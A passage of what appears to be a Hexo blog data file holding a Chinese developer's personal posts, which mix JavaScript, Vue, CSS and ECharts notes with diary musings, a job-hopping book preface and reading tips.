空间问题，缩短时间问题。\n\n具体技术：VR、人脸识别、微表情、触觉感应器\n\n改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。\n\n","slug":"改变世界的想法","published":1,"updated":"2018-09-05T06:33:18.514Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxro000wzodvk2kbaret","content":"<p>在当下的宇宙中，目前人类科技，两大难题。时间 和 空间</p>\n<p>改变世界的方法一：类似《头号玩家》的虚拟现实，解决 空间问题，缩短时间问题。</p>\n<p>具体技术：VR、人脸识别、微表情、触觉感应器</p>\n<p>改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在当下的宇宙中，目前人类科技，两大难题。时间 和 空间</p>\n<p>改变世界的方法一：类似《头号玩家》的虚拟现实，解决 空间问题，缩短时间问题。</p>\n<p>具体技术：VR、人脸识别、微表情、触觉感应器</p>\n<p>改变世界的方法二：物理硬件 的飞行器。降低成本，解放人类空间自由度。</p>\n"},{"title":"日常知识点","date":"2017-05-09T06:15:10.000Z","_content":"stringify: JSON转字符串\n\ntoString: 返回原型数组\n\nValueOf: 输出对象\n\ntoLocalString: 格式化时间字符串\n\nV-bind用法: 计算属性基于this依赖进行缓存\n\nComputed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算\n\n[前端-数据双向绑定](https://juejin.im/post/5af1980a6fb9a07acb3cd4e3)\n\n[node-爬虫](https://juejin.im/post/5af01d27f265da0b7f447ab6)\n\n[Git plugin](https://juejin.im/post/5af152c1518825673e359539)\n","source":"_posts/日常知识点.md","raw":"---\ntitle: 日常知识点\ndate: 2017-05-09 14:15:10\ntags: 日常知识点\ncategories: 知识点\n---\nstringify: JSON转字符串\n\ntoString: 返回原型数组\n\nValueOf: 输出对象\n\ntoLocalString: 格式化时间字符串\n\nV-bind用法: 计算属性基于this依赖进行缓存\n\nComputed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算\n\n[前端-数据双向绑定](https://juejin.im/post/5af1980a6fb9a07acb3cd4e3)\n\n[node-爬虫](https://juejin.im/post/5af01d27f265da0b7f447ab6)\n\n[Git plugin](https://juejin.im/post/5af152c1518825673e359539)\n","slug":"日常知识点","published":1,"updated":"2018-09-05T06:33:18.515Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrr0010zodvphf38iix","content":"<p>stringify: JSON转字符串</p>\n<p>toString: 返回原型数组</p>\n<p>ValueOf: 输出对象</p>\n<p>toLocalString: 格式化时间字符串</p>\n<p>V-bind用法: 计算属性基于this依赖进行缓存</p>\n<p>Computed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算</p>\n<p><a href=\"https://juejin.im/post/5af1980a6fb9a07acb3cd4e3\" target=\"_blank\" rel=\"noopener\">前端-数据双向绑定</a></p>\n<p><a href=\"https://juejin.im/post/5af01d27f265da0b7f447ab6\" target=\"_blank\" rel=\"noopener\">node-爬虫</a></p>\n<p><a href=\"https://juejin.im/post/5af152c1518825673e359539\" target=\"_blank\" rel=\"noopener\">Git plugin</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>stringify: JSON转字符串</p>\n<p>toString: 返回原型数组</p>\n<p>ValueOf: 输出对象</p>\n<p>toLocalString: 格式化时间字符串</p>\n<p>V-bind用法: 计算属性基于this依赖进行缓存</p>\n<p>Computed 与 Method 区别: Computed基于依赖缓存; Method每次都重新计算</p>\n<p><a href=\"https://juejin.im/post/5af1980a6fb9a07acb3cd4e3\" target=\"_blank\" rel=\"noopener\">前端-数据双向绑定</a></p>\n<p><a href=\"https://juejin.im/post/5af01d27f265da0b7f447ab6\" target=\"_blank\" rel=\"noopener\">node-爬虫</a></p>\n<p><a href=\"https://juejin.im/post/5af152c1518825673e359539\" target=\"_blank\" rel=\"noopener\">Git plugin</a></p>\n"},{"title":"日常记录","date":"2018-08-02T08:46:26.000Z","_content":"## \n> 天高地迥，觉宇宙之无穷。\n>\n> 兴尽悲来，识盈虚之有数。\n> \n>                ——王勃 \n\n### CSS hover 改变高度\n1. 用百分比固定元素高度\n2. font-size 设为 0","source":"_posts/日常记录.md","raw":"---\ntitle: 日常记录\ndate: 2018-08-02 16:46:26\ntags: 日记\ncategories: 日常记录\n---\n## \n> 天高地迥，觉宇宙之无穷。\n>\n> 兴尽悲来，识盈虚之有数。\n> \n>                ——王勃 \n\n### CSS hover 改变高度\n1. 用百分比固定元素高度\n2. font-size 设为 0","slug":"日常记录","published":1,"updated":"2018-09-05T06:33:18.515Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrs0012zodv0x0hhgb9","content":"<p>## </p>\n<blockquote>\n<p>天高地迥，觉宇宙之无穷。</p>\n<p>兴尽悲来，识盈虚之有数。</p>\n<pre><code>——王勃 \n</code></pre></blockquote>\n<h3 id=\"CSS-hover-改变高度\"><a href=\"#CSS-hover-改变高度\" class=\"headerlink\" title=\"CSS hover 改变高度\"></a>CSS hover 改变高度</h3><ol>\n<li>用百分比固定元素高度</li>\n<li>font-size 设为 0</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>## </p>\n<blockquote>\n<p>天高地迥，觉宇宙之无穷。</p>\n<p>兴尽悲来，识盈虚之有数。</p>\n<pre><code>——王勃 \n</code></pre></blockquote>\n<h3 id=\"CSS-hover-改变高度\"><a href=\"#CSS-hover-改变高度\" class=\"headerlink\" title=\"CSS hover 改变高度\"></a>CSS hover 改变高度</h3><ol>\n<li>用百分比固定元素高度</li>\n<li>font-size 设为 0</li>\n</ol>\n"},{"title":"日常随笔","date":"2015-05-01T02:31:27.000Z","_content":"# 关于写blog的意义\n\n博客日志相当于一个日常记事本，可以理解为日记，学习笔记。\n\n工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。\n\n俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。\n\n罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。\n\n这就说明我们不应该以 `收集知识的总量` 来衡量 一个人的学识，而是应该判断 一个人 `掌握知识的总量` 来确定他的学识。\n\n判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\\n或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。\n\n所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行`思考` 并 `建立索引`的过称。\n\n---\n## 权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\n2018年7月24日 16:27:27\n\n---\n## 我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\n2018年7月25日 16:27:35\n\n> “洋人又能制物为裸妇人，肌肤骸骨耳目齿舌，阴窍无一不具，初折迭如衣物，以气吹之，则柔软温暖如美人，可拥以交接如人道，其巧而丧心如此。”","source":"_posts/日常随笔.md","raw":"---\ntitle: 日常随笔\ndate: 2015-05-1 10:31:27\ntags: 感悟\ncategories: 日记\n---\n# 关于写blog的意义\n\n博客日志相当于一个日常记事本，可以理解为日记，学习笔记。\n\n工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。\n\n俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。\n\n罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。\n\n这就说明我们不应该以 `收集知识的总量` 来衡量 一个人的学识，而是应该判断 一个人 `掌握知识的总量` 来确定他的学识。\n\n判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\\n或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。\n\n所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行`思考` 并 `建立索引`的过称。\n\n---\n## 权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\n2018年7月24日 16:27:27\n\n---\n## 我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\n2018年7月25日 16:27:35\n\n> “洋人又能制物为裸妇人，肌肤骸骨耳目齿舌，阴窍无一不具，初折迭如衣物，以气吹之，则柔软温暖如美人，可拥以交接如人道，其巧而丧心如此。”","slug":"日常随笔","published":1,"updated":"2018-09-05T06:33:18.515Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrv0016zodv1uxhatce","content":"<h1 id=\"关于写blog的意义\"><a href=\"#关于写blog的意义\" class=\"headerlink\" title=\"关于写blog的意义\"></a>关于写blog的意义</h1><p>博客日志相当于一个日常记事本，可以理解为日记，学习笔记。</p>\n<p>工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。</p>\n<p>俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。</p>\n<p>罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。</p>\n<p>这就说明我们不应该以 <code>收集知识的总量</code> 来衡量 一个人的学识，而是应该判断 一个人 <code>掌握知识的总量</code> 来确定他的学识。</p>\n<p>判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\<br>或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。</p>\n<p>所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行<code>思考</code> 并 <code>建立索引</code>的过称。</p>\n<hr>\n<h2 id=\"权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\"><a href=\"#权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\" class=\"headerlink\" title=\"权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\"></a>权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。</h2><p>2018年7月24日 16:27:27</p>\n<hr>\n<h2 id=\"我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\"><a href=\"#我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\" class=\"headerlink\" title=\"我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\"></a>我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》</h2><p>2018年7月25日 16:27:35</p>\n<blockquote>\n<p>“洋人又能制物为裸妇人，肌肤骸骨耳目齿舌，阴窍无一不具，初折迭如衣物，以气吹之，则柔软温暖如美人，可拥以交接如人道，其巧而丧心如此。”</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"关于写blog的意义\"><a href=\"#关于写blog的意义\" class=\"headerlink\" title=\"关于写blog的意义\"></a>关于写blog的意义</h1><p>博客日志相当于一个日常记事本，可以理解为日记，学习笔记。</p>\n<p>工作的状态也是属于不停学习的状态，在我们遇到问题的时候，大脑进行思考，以及运用互联网解决问题的过程，都会收获 想法 与 知识。</p>\n<p>俗话说：好记性不如烂笔头。在保持勤思考的同时，也应该及时做记录。</p>\n<p>罗辑思维《如何成为一个高手》里讲到: 钱钟书虽然是响当当的文学家，但是家里是没有多少藏书的 ( 相对而言，不可片面认知 ) ，更多的是记笔记的笔记本。</p>\n<p>这就说明我们不应该以 <code>收集知识的总量</code> 来衡量 一个人的学识，而是应该判断 一个人 <code>掌握知识的总量</code> 来确定他的学识。</p>\n<p>判断掌握知识的标准，在《罗辑思维》里被界定为，知道、理解知识的运用方法及手段。\\<br>或者说可以理解为，遇到问题，在大脑里有解决问题的思路与方法。相当于数据库的索引，可以快速调取知识，如果是庞杂的知识体量可以用静态资源目录的方式储存（类似于遇到问题用百度，但是要知道查询什么知识点）。</p>\n<p>所以我认为，blog的过程就是，大脑对 问题 和 知识点 进行<code>思考</code> 并 <code>建立索引</code>的过称。</p>\n<hr>\n<h2 id=\"权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\"><a href=\"#权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\" class=\"headerlink\" title=\"权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。\"></a>权力与理想的斗争，是人类自有文明以来，迄今仍在不断探索的命题。</h2><p>2018年7月24日 16:27:27</p>\n<hr>\n<h2 id=\"我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\"><a href=\"#我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\" class=\"headerlink\" title=\"我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》\"></a>我国对于充气娃娃最早的记载，是在中国学者夏燮的《中西纪事》</h2><p>2018年7月25日 16:27:35</p>\n<blockquote>\n<p>“洋人又能制物为裸妇人，肌肤骸骨耳目齿舌，阴窍无一不具，初折迭如衣物，以气吹之，则柔软温暖如美人，可拥以交接如人道，其巧而丧心如此。”</p>\n</blockquote>\n"},{"title":"深入理解JS面相对象编程","date":"2018-07-20T00:53:24.000Z","_content":"","source":"_posts/深入理解JS面相对象编程.md","raw":"---\ntitle: 深入理解JS面相对象编程\ndate: 2018-07-20 08:53:24\ntags:\ncategories:\n---\n","slug":"深入理解JS面相对象编程","published":1,"updated":"2018-09-05T06:33:18.516Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrx0018zodvjybyzqdl","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"知乎-跳槽有术","date":"2018-07-23T08:43:28.000Z","_content":"## 在这个高度不确定的时代，我们到底该如何跳槽？\n### [序言:](https://zhuanlan.zhihu.com/p/40227853)\n“这是最好的时代，也是最坏的时代，这是智慧的时代，也是愚蠢的时代；这是信仰的时期，也是怀疑的时期；这是光明的季节，也是黑暗的季节；这是希望之春，也是失望之冬；我们拥有一切，我们一无所有；有人直登天堂，有人坠入地狱。”英国作家狄更斯在100多年前的名著《双城记》中写下的这段话，放在今天的中国职场，依然无比贴切。\n\n这确实是一个剧烈变化、节奏飞快、充满了不确定性的时代，对职场人而言尤其如此。那种一个企业待到老，一直工作到退休的时代已经一去不复返了，取而代之的是频繁的跳槽。\n\n`LinkedIn（领英）`《2018中国人才招聘趋势报告》显示，中国职场人跳槽周期逐年缩短，平均在职时间从`两年前的34个月`缩短到`22个月`，也就意味着很多人`不到2年`就会换一次工作，而就笔者这十几年招聘工作的一线观察，`90后跳槽的频率更高`，很多刚毕业的年轻人每年都会换一次工作，一年换2-3次工作的也为数不少。于是，有人戏称，职场人不是在跳槽的路上，就是在准备跳槽。\n\n国企 打破 终身制，中国中小企业的平均寿命只有2.5年\n\n对`职场人`来说，跳槽换工作是所有职场人的必修课\n\n对`企业`来说，员工跳槽、人才流动也是所有企业都必须面对的残酷现实。\n\n\n### 很多人都明白`跳槽是不可避免的`,但是:\n````\n怎么跳槽才能跳的更好?\n\n怎么跳槽才能不跳到坑里?\n\n什么时间跳槽比较合适?\n\n如何高效的跳槽?\n\n如何规避跳槽的各种风险?\n\n如何在跳槽时为自己争取一份更好的薪水?\n\n如何应对背景调查等等一系列问题\n````\n\n[正文阅读](https://www.zhihu.com/pub/reader/119567226/chapter/1003366960175890432)\n\n---\n2018年7月23日 17:08:05 待续","source":"_posts/知乎-跳槽有术.md","raw":"---\ntitle: 知乎-跳槽有术\ndate: 2018-07-23 16:43:28\ntags: 跳槽\ncategories: 知乎\n---\n## 在这个高度不确定的时代，我们到底该如何跳槽？\n### [序言:](https://zhuanlan.zhihu.com/p/40227853)\n“这是最好的时代，也是最坏的时代，这是智慧的时代，也是愚蠢的时代；这是信仰的时期，也是怀疑的时期；这是光明的季节，也是黑暗的季节；这是希望之春，也是失望之冬；我们拥有一切，我们一无所有；有人直登天堂，有人坠入地狱。”英国作家狄更斯在100多年前的名著《双城记》中写下的这段话，放在今天的中国职场，依然无比贴切。\n\n这确实是一个剧烈变化、节奏飞快、充满了不确定性的时代，对职场人而言尤其如此。那种一个企业待到老，一直工作到退休的时代已经一去不复返了，取而代之的是频繁的跳槽。\n\n`LinkedIn（领英）`《2018中国人才招聘趋势报告》显示，中国职场人跳槽周期逐年缩短，平均在职时间从`两年前的34个月`缩短到`22个月`，也就意味着很多人`不到2年`就会换一次工作，而就笔者这十几年招聘工作的一线观察，`90后跳槽的频率更高`，很多刚毕业的年轻人每年都会换一次工作，一年换2-3次工作的也为数不少。于是，有人戏称，职场人不是在跳槽的路上，就是在准备跳槽。\n\n国企 打破 终身制，中国中小企业的平均寿命只有2.5年\n\n对`职场人`来说，跳槽换工作是所有职场人的必修课\n\n对`企业`来说，员工跳槽、人才流动也是所有企业都必须面对的残酷现实。\n\n\n### 很多人都明白`跳槽是不可避免的`,但是:\n````\n怎么跳槽才能跳的更好?\n\n怎么跳槽才能不跳到坑里?\n\n什么时间跳槽比较合适?\n\n如何高效的跳槽?\n\n如何规避跳槽的各种风险?\n\n如何在跳槽时为自己争取一份更好的薪水?\n\n如何应对背景调查等等一系列问题\n````\n\n[正文阅读](https://www.zhihu.com/pub/reader/119567226/chapter/1003366960175890432)\n\n---\n2018年7月23日 17:08:05 待续","slug":"知乎-跳槽有术","published":1,"updated":"2018-09-05T06:33:18.516Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxs1001czodvic99k20l","content":"<h2 id=\"在这个高度不确定的时代，我们到底该如何跳槽？\"><a href=\"#在这个高度不确定的时代，我们到底该如何跳槽？\" class=\"headerlink\" title=\"在这个高度不确定的时代，我们到底该如何跳槽？\"></a>在这个高度不确定的时代，我们到底该如何跳槽？</h2><h3 id=\"序言\"><a href=\"#序言\" class=\"headerlink\" title=\"序言:\"></a><a href=\"https://zhuanlan.zhihu.com/p/40227853\" target=\"_blank\" rel=\"noopener\">序言:</a></h3><p>“这是最好的时代，也是最坏的时代，这是智慧的时代，也是愚蠢的时代；这是信仰的时期，也是怀疑的时期；这是光明的季节，也是黑暗的季节；这是希望之春，也是失望之冬；我们拥有一切，我们一无所有；有人直登天堂，有人坠入地狱。”英国作家狄更斯在100多年前的名著《双城记》中写下的这段话，放在今天的中国职场，依然无比贴切。</p>\n<p>这确实是一个剧烈变化、节奏飞快、充满了不确定性的时代，对职场人而言尤其如此。那种一个企业待到老，一直工作到退休的时代已经一去不复返了，取而代之的是频繁的跳槽。</p>\n<p><code>LinkedIn（领英）</code>《2018中国人才招聘趋势报告》显示，中国职场人跳槽周期逐年缩短，平均在职时间从<code>两年前的34个月</code>缩短到<code>22个月</code>，也就意味着很多人<code>不到2年</code>就会换一次工作，而就笔者这十几年招聘工作的一线观察，<code>90后跳槽的频率更高</code>，很多刚毕业的年轻人每年都会换一次工作，一年换2-3次工作的也为数不少。于是，有人戏称，职场人不是在跳槽的路上，就是在准备跳槽。</p>\n<p>国企 打破 终身制，中国中小企业的平均寿命只有2.5年</p>\n<p>对<code>职场人</code>来说，跳槽换工作是所有职场人的必修课</p>\n<p>对<code>企业</code>来说，员工跳槽、人才流动也是所有企业都必须面对的残酷现实。</p>\n<h3 id=\"很多人都明白跳槽是不可避免的-但是\"><a href=\"#很多人都明白跳槽是不可避免的-但是\" class=\"headerlink\" title=\"很多人都明白跳槽是不可避免的,但是:\"></a>很多人都明白<code>跳槽是不可避免的</code>,但是:</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">怎么跳槽才能跳的更好?</span><br><span class=\"line\"></span><br><span class=\"line\">怎么跳槽才能不跳到坑里?</span><br><span class=\"line\"></span><br><span class=\"line\">什么时间跳槽比较合适?</span><br><span class=\"line\"></span><br><span class=\"line\">如何高效的跳槽?</span><br><span class=\"line\"></span><br><span class=\"line\">如何规避跳槽的各种风险?</span><br><span class=\"line\"></span><br><span class=\"line\">如何在跳槽时为自己争取一份更好的薪水?</span><br><span class=\"line\"></span><br><span class=\"line\">如何应对背景调查等等一系列问题</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.zhihu.com/pub/reader/119567226/chapter/1003366960175890432\" target=\"_blank\" rel=\"noopener\">正文阅读</a></p>\n<hr>\n<p>2018年7月23日 17:08:05 待续</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"在这个高度不确定的时代，我们到底该如何跳槽？\"><a href=\"#在这个高度不确定的时代，我们到底该如何跳槽？\" class=\"headerlink\" title=\"在这个高度不确定的时代，我们到底该如何跳槽？\"></a>在这个高度不确定的时代，我们到底该如何跳槽？</h2><h3 id=\"序言\"><a href=\"#序言\" class=\"headerlink\" title=\"序言:\"></a><a href=\"https://zhuanlan.zhihu.com/p/40227853\" target=\"_blank\" rel=\"noopener\">序言:</a></h3><p>“这是最好的时代，也是最坏的时代，这是智慧的时代，也是愚蠢的时代；这是信仰的时期，也是怀疑的时期；这是光明的季节，也是黑暗的季节；这是希望之春，也是失望之冬；我们拥有一切，我们一无所有；有人直登天堂，有人坠入地狱。”英国作家狄更斯在100多年前的名著《双城记》中写下的这段话，放在今天的中国职场，依然无比贴切。</p>\n<p>这确实是一个剧烈变化、节奏飞快、充满了不确定性的时代，对职场人而言尤其如此。那种一个企业待到老，一直工作到退休的时代已经一去不复返了，取而代之的是频繁的跳槽。</p>\n<p><code>LinkedIn（领英）</code>《2018中国人才招聘趋势报告》显示，中国职场人跳槽周期逐年缩短，平均在职时间从<code>两年前的34个月</code>缩短到<code>22个月</code>，也就意味着很多人<code>不到2年</code>就会换一次工作，而就笔者这十几年招聘工作的一线观察，<code>90后跳槽的频率更高</code>，很多刚毕业的年轻人每年都会换一次工作，一年换2-3次工作的也为数不少。于是，有人戏称，职场人不是在跳槽的路上，就是在准备跳槽。</p>\n<p>国企 打破 终身制，中国中小企业的平均寿命只有2.5年</p>\n<p>对<code>职场人</code>来说，跳槽换工作是所有职场人的必修课</p>\n<p>对<code>企业</code>来说，员工跳槽、人才流动也是所有企业都必须面对的残酷现实。</p>\n<h3 id=\"很多人都明白跳槽是不可避免的-但是\"><a href=\"#很多人都明白跳槽是不可避免的-但是\" class=\"headerlink\" title=\"很多人都明白跳槽是不可避免的,但是:\"></a>很多人都明白<code>跳槽是不可避免的</code>,但是:</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">怎么跳槽才能跳的更好?</span><br><span class=\"line\"></span><br><span class=\"line\">怎么跳槽才能不跳到坑里?</span><br><span class=\"line\"></span><br><span class=\"line\">什么时间跳槽比较合适?</span><br><span class=\"line\"></span><br><span class=\"line\">如何高效的跳槽?</span><br><span class=\"line\"></span><br><span class=\"line\">如何规避跳槽的各种风险?</span><br><span class=\"line\"></span><br><span class=\"line\">如何在跳槽时为自己争取一份更好的薪水?</span><br><span class=\"line\"></span><br><span class=\"line\">如何应对背景调查等等一系列问题</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.zhihu.com/pub/reader/119567226/chapter/1003366960175890432\" target=\"_blank\" rel=\"noopener\">正文阅读</a></p>\n<hr>\n<p>2018年7月23日 17:08:05 待续</p>\n"},{"title":"获取MAC地址","date":"2018-06-22T06:24:02.000Z","_content":"## Node模块获取MAC地址\n\n[阅读原文](https://www.npmjs.com/package/address)\n","source":"_posts/获取MAC地址.md","raw":"---\ntitle: 获取MAC地址\ndate: 2018-06-22 14:24:02\ntags: Node获取MAC地址\ncategories: Node\n---\n## Node模块获取MAC地址\n\n[阅读原文](https://www.npmjs.com/package/address)\n","slug":"获取MAC地址","published":1,"updated":"2018-09-05T06:33:18.516Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxs3001ezodvjpo2cry1","content":"<h2 id=\"Node模块获取MAC地址\"><a href=\"#Node模块获取MAC地址\" class=\"headerlink\" title=\"Node模块获取MAC地址\"></a>Node模块获取MAC地址</h2><p><a href=\"https://www.npmjs.com/package/address\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Node模块获取MAC地址\"><a href=\"#Node模块获取MAC地址\" class=\"headerlink\" title=\"Node模块获取MAC地址\"></a>Node模块获取MAC地址</h2><p><a href=\"https://www.npmjs.com/package/address\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"阅读理解","date":"2018-04-20T02:51:01.000Z","archives":"大脑训练","_content":"为什么你的阅读速度慢、理解力低？\n\n## 视觉商数\n\n## 阅读习惯\n\n## 记忆理解习惯<br>\n+ 理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。\n","source":"_posts/阅读理解.md","raw":"---\ntitle: 阅读理解\ndate: 2018-04-20 10:51:01\ntags: 文学技能\narchives: 大脑训练\ncategories: 文学技能\n---\n为什么你的阅读速度慢、理解力低？\n\n## 视觉商数\n\n## 阅读习惯\n\n## 记忆理解习惯<br>\n+ 理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。\n","slug":"阅读理解","published":1,"updated":"2018-09-05T06:33:18.517Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxs6001gzodvo8v6aj1a","content":"<p>为什么你的阅读速度慢、理解力低？</p>\n<h2 id=\"视觉商数\"><a href=\"#视觉商数\" class=\"headerlink\" title=\"视觉商数\"></a>视觉商数</h2><h2 id=\"阅读习惯\"><a href=\"#阅读习惯\" class=\"headerlink\" title=\"阅读习惯\"></a>阅读习惯</h2><h2 id=\"记忆理解习惯\"><a href=\"#记忆理解习惯\" class=\"headerlink\" title=\"记忆理解习惯\"></a>记忆理解习惯<br></h2><ul>\n<li>理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>为什么你的阅读速度慢、理解力低？</p>\n<h2 id=\"视觉商数\"><a href=\"#视觉商数\" class=\"headerlink\" title=\"视觉商数\"></a>视觉商数</h2><h2 id=\"阅读习惯\"><a href=\"#阅读习惯\" class=\"headerlink\" title=\"阅读习惯\"></a>阅读习惯</h2><h2 id=\"记忆理解习惯\"><a href=\"#记忆理解习惯\" class=\"headerlink\" title=\"记忆理解习惯\"></a>记忆理解习惯<br></h2><ul>\n<li>理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。</li>\n</ul>\n"},{"title":"echarts轴最大数分割算法","date":"2018-12-29T03:45:00.000Z","_content":"## 最大值 以及 分割数 计算\n````\n// echarts 支持callback函数\nmax: ({ max, min }) => {\n  /** 判断最大值的长度 减一是因为 两位数只用 除10 即可，即保留十位上的为整数，以此类推 */\n  let maxLen = max.toString().length - 1;\n\n  /** 取平方 */\n  let pow = Math.pow(10, maxLen)\n  let pow2 = Number(`10e${max.toString().length - 1}`)\n\n  // 取整\n  let ceilMax = Math.ceil(max / pow) * pow;\n  this.state.max = ceilMax;\n  this.state.min = min;\n  return ceilMax\n},\n\n// 不支持 callback，可以 通过 state缓存 max 函数 中最大值计算\ninterval: (() => this.state.max / 5)(),\n````\n","source":"_posts/Algorithm/echarts轴最大数分割算法.md","raw":"---\ntitle: echarts轴最大数分割算法\ndate: 2018-12-29 11:45:00\ntags:\ncategories: Algorithm\n---\n## 最大值 以及 分割数 计算\n````\n// echarts 支持callback函数\nmax: ({ max, min }) => {\n  /** 判断最大值的长度 减一是因为 两位数只用 除10 即可，即保留十位上的为整数，以此类推 */\n  let maxLen = max.toString().length - 1;\n\n  /** 取平方 */\n  let pow = Math.pow(10, maxLen)\n  let pow2 = Number(`10e${max.toString().length - 1}`)\n\n  // 取整\n  let ceilMax = Math.ceil(max / pow) * pow;\n  this.state.max = ceilMax;\n  this.state.min = min;\n  return ceilMax\n},\n\n// 不支持 callback，可以 通过 state缓存 max 函数 中最大值计算\ninterval: (() => this.state.max / 5)(),\n````\n","slug":"Algorithm/echarts轴最大数分割算法","published":1,"updated":"2018-12-29T06:34:34.224Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxuc002azodvoq0t49kh","content":"<h2 id=\"最大值-以及-分割数-计算\"><a href=\"#最大值-以及-分割数-计算\" class=\"headerlink\" title=\"最大值 以及 分割数 计算\"></a>最大值 以及 分割数 计算</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 